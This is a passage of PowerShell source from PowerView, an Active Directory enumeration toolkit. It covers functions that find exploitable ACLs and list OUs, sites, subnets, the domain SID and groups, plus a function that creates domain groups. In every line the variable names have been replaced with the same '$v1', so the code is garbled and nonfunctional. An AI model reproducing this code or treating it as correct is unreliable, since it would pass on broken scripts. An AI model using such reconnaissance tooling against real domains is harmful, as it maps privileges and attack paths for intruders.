        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{}
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }


        $v1 = @{}
    }

    PROCESS {
        if ($v1['Domain']) {
            $v1['Domain'] = $v1
            $v1['Domain'] = $v1
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($v1.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($v1.ActiveDirectoryRights -match 'ExtendedRight') -and ($v1.AceQualifier -match 'Allow'))) {

                if ($v1.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($v1[$v1.SecurityIdentifier.Value]) {
                        $v1, $v1, $v1, $v1 = $v1[$v1.SecurityIdentifier.Value]

                        $v1 = New-Object PSObject
                        $v1 | Add-Member NoteProperty 'ObjectDN' $v1.ObjectDN
                        $v1 | Add-Member NoteProperty 'AceQualifier' $v1.AceQualifier
                        $v1 | Add-Member NoteProperty 'ActiveDirectoryRights' $v1.ActiveDirectoryRights
                        if ($v1.ObjectAceType) {
                            $v1 | Add-Member NoteProperty 'ObjectAceType' $v1.ObjectAceType
                        }
                        else {
                            $v1 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $v1 | Add-Member NoteProperty 'AceFlags' $v1.AceFlags
                        $v1 | Add-Member NoteProperty 'AceType' $v1.AceType
                        $v1 | Add-Member NoteProperty 'InheritanceFlags' $v1.InheritanceFlags
                        $v1 | Add-Member NoteProperty 'SecurityIdentifier' $v1.SecurityIdentifier
                        $v1 | Add-Member NoteProperty 'IdentityReferenceName' $v1
                        $v1 | Add-Member NoteProperty 'IdentityReferenceDomain' $v1
                        $v1 | Add-Member NoteProperty 'IdentityReferenceDN' $v1
                        $v1 | Add-Member NoteProperty 'IdentityReferenceClass' $v1
                        $v1
                    }
                    else {
                        $v1 = Convert-ADName -Identity $v1.SecurityIdentifier.Value -OutputType DN @ADNameArguments


                        if ($v1) {
                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

                            $v1['Domain'] = $v1
                            $v1['Identity'] = $v1

                            $v1 = Get-DomainObject @ObjectSearcherArguments

                            if ($v1) {
                                $v1 = $v1.Properties.samaccountname[0]
                                if ($v1.Properties.objectclass -match 'computer') {
                                    $v1 = 'computer'
                                }
                                elseif ($v1.Properties.objectclass -match 'group') {
                                    $v1 = 'group'
                                }
                                elseif ($v1.Properties.objectclass -match 'user') {
                                    $v1 = 'user'
                                }
                                else {
                                    $v1 = $v1
                                }


                                $v1[$v1.SecurityIdentifier.Value] = $v1, $v1, $v1, $v1

                                $v1 = New-Object PSObject
                                $v1 | Add-Member NoteProperty 'ObjectDN' $v1.ObjectDN
                                $v1 | Add-Member NoteProperty 'AceQualifier' $v1.AceQualifier
                                $v1 | Add-Member NoteProperty 'ActiveDirectoryRights' $v1.ActiveDirectoryRights
                                if ($v1.ObjectAceType) {
                                    $v1 | Add-Member NoteProperty 'ObjectAceType' $v1.ObjectAceType
                                }
                                else {
                                    $v1 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $v1 | Add-Member NoteProperty 'AceFlags' $v1.AceFlags
                                $v1 | Add-Member NoteProperty 'AceType' $v1.AceType
                                $v1 | Add-Member NoteProperty 'InheritanceFlags' $v1.InheritanceFlags
                                $v1 | Add-Member NoteProperty 'SecurityIdentifier' $v1.SecurityIdentifier
                                $v1 | Add-Member NoteProperty 'IdentityReferenceName' $v1
                                $v1 | Add-Member NoteProperty 'IdentityReferenceDomain' $v1
                                $v1 | Add-Member NoteProperty 'IdentityReferenceDN' $v1
                                $v1 | Add-Member NoteProperty 'IdentityReferenceClass' $v1
                                $v1
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($v1.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^OU=.*') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                else {
                    try {
                        $v1 = (-Join (([Guid]$v1).ToByteArray() | ForEach-Object {$v1.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $v1 += "(objectguid=$v1)"
                    }
                    catch {
                        $v1 += "(name=$v1)"
                    }
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $v1 set in the gpLink property"
                $v1 += "(gplink=*$v1*)"
            }

            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }

            $v1.filter = "(&(objectCategory=organizationalUnit)$v1)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1['Raw']) {

                    $v1 = $v1
                }
                else {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                }
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $v1
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainSite {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^CN=.*') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                else {
                    try {
                        $v1 = (-Join (([Guid]$v1).ToByteArray() | ForEach-Object {$v1.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $v1 += "(objectguid=$v1)"
                    }
                    catch {
                        $v1 += "(name=$v1)"
                    }
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $v1 set in the gpLink property"
                $v1 += "(gplink=*$v1*)"
            }

            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }

            $v1.filter = "(&(objectCategory=site)$v1)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindAll() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1['Raw']) {

                    $v1 = $v1
                }
                else {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                }
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $v1
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainSubnet {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^CN=.*') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                else {
                    try {
                        $v1 = (-Join (([Guid]$v1).ToByteArray() | ForEach-Object {$v1.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $v1 += "(objectguid=$v1)"
                    }
                    catch {
                        $v1 += "(name=$v1)"
                    }
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }

            $v1.filter = "(&(objectCategory=subnet)$v1)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1['Raw']) {

                    $v1 = $v1
                }
                else {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                }
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($v1['SiteName']) {


                    if ($v1.properties -and ($v1.properties.siteobject -like "*$v1*")) {
                        $v1
                    }
                    elseif ($v1.siteobject -like "*$v1*") {
                        $v1
                    }
                }
                else {
                    $v1
                }
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainSID {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    $v1 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($v1['Domain']) { $v1['Domain'] = $v1 }
    if ($v1['Server']) { $v1['Server'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }

    $v1 = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($v1) {
        $v1.SubString(0, $v1.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$v1'"
    }
}


function Get-DomainGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $v1,

        [Switch]
        $v1,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $v1,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($v1) {
            if ($v1['MemberIdentity']) {

                if ($v1['Properties']) {
                    $v1 = $v1['Properties']
                }

                $v1['Identity'] = $v1
                $v1['Raw'] = $v1

                Get-DomainObject @SearcherArguments | ForEach-Object {

                    $v1 = $v1.GetDirectoryEntry()


                    $v1.RefreshCache('tokenGroups')

                    $v1.TokenGroups | ForEach-Object {

                        $v1 = (New-Object System.Security.Principal.SecurityIdentifier($v1,0)).Value


                        if ($v1 -notmatch '^S-1-5-32-.*') {
                            $v1['Identity'] = $v1
                            $v1['Raw'] = $v1
                            if ($v1) { $v1['Properties'] = $v1 }
                            $v1 = Get-DomainObject @SearcherArguments
                            if ($v1) {
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $v1
                            }
                        }
                    }
                }
            }
            else {
                $v1 = ''
                $v1 = ''
                $v1 | Where-Object {$v1} | ForEach-Object {
                    $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                    if ($v1 -match '^S-1-') {
                        $v1 += "(objectsid=$v1)"
                    }
                    elseif ($v1 -match '^CN=') {
                        $v1 += "(distinguishedname=$v1)"
                        if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$v1' from '$v1'"
                            $v1['Domain'] = $v1
                            $v1 = Get-DomainSearcher @SearcherArguments
                            if (-not $v1) {
                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$v1'"
                            }
                        }
                    }
                    elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                        $v1 += "(objectguid=$v1)"
                    }
                    elseif ($v1.Contains('\')) {
                        $v1 = $v1.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($v1) {
                            $v1 = $v1.SubString(0, $v1.IndexOf('/'))
                            $v1 = $v1.Split('\')[1]
                            $v1 += "(samAccountName=$v1)"
                            $v1['Domain'] = $v1
                            Write-Verbose "[Get-DomainGroup] Extracted domain '$v1' from '$v1'"
                            $v1 = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $v1 += "(|(samAccountName=$v1)(name=$v1))"
                    }
                }

                if ($v1 -and ($v1.Trim() -ne '') ) {
                    $v1 += "(|$v1)"
                }

                if ($v1['AdminCount']) {
                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
                    $v1 += '(admincount=1)'
                }
                if ($v1['GroupScope']) {
                    $v1 = $v1['GroupScope']
                    $v1 = Switch ($v1) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$v1'"
                }
                if ($v1['GroupProperty']) {
                    $v1 = $v1['GroupProperty']
                    $v1 = Switch ($v1) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[Get-DomainGroup] Searching for group property '$v1'"
                }
                if ($v1['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $v1"
                    $v1 += "$v1"
                }

                $v1.filter = "(&(objectCategory=group)$v1)"
                Write-Verbose "[Get-DomainGroup] filter string: $($v1.filter)"

                if ($v1['FindOne']) { $v1 = $v1.FindOne() }
                else { $v1 = $v1.FindAll() }
                $v1 | Where-Object {$v1} | ForEach-Object {
                    if ($v1['Raw']) {

                        $v1 = $v1
                    }
                    else {
                        $v1 = Convert-LDAPProperty -Properties $v1.Properties
                    }
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $v1
                }
                if ($v1) {
                    try { $v1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                    }
                }
                $v1.dispose()
            }
        }
    }
}


function New-DomainGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $v1)]
        [ValidateLength(0, 256)]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    $v1 = @{
        'Identity' = $v1
    }
    if ($v1['Domain']) { $v1['Domain'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }
    $v1 = Get-PrincipalContext @ContextArguments

    if ($v1) {
        $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($v1.Context)


        $v1.SamAccountName = $v1.Identity

        if ($v1['Name']) {
            $v1.Name = $v1
        }
        else {
            $v1.Name = $v1.Identity
        }
        if ($v1['DisplayName']) {
            $v1.DisplayName = $v1
        }
        else {
            $v1.DisplayName = $v1.Identity
        }

        if ($v1['Description']) {
            $v1.Description = $v1
        }

        Write-Verbose "[New-DomainGroup] Attempting to create group '$v1'"
        try {
            $v1 = $v1.Save()
            Write-Verbose "[New-DomainGroup] Group '$v1' successfully created"
            $v1
        }
        catch {
            Write-Warning "[New-DomainGroup] Error creating group '$v1' : $v1"
        }
    }
}


function Get-DomainManagedSecurityGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['Domain']) {
            $v1['Domain'] = $v1
            $v1 = $v1
        }
        else {
            $v1 = $v1:USERDNSDOMAIN
        }


        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $v1['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $v1['Identity'] = $v1.managedBy
            $v1 = $v1.Remove('LDAPFilter')



            $v1 = Get-DomainObject @SearcherArguments

            $v1 = New-Object PSObject
            $v1 | Add-Member Noteproperty 'GroupName' $v1.samaccountname
            $v1 | Add-Member Noteproperty 'GroupDistinguishedName' $v1.distinguishedname
            $v1 | Add-Member Noteproperty 'ManagerName' $v1.samaccountname
            $v1 | Add-Member Noteproperty 'ManagerDistinguishedName' $v1.distinguishedName


            if ($v1.samaccounttype -eq 0x10000000) {
                $v1 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($v1.samaccounttype -eq 0x30000000) {
                $v1 | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $v1 = @{
                'Identity' = $v1.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
            if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
            if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
            if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }













            $v1 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

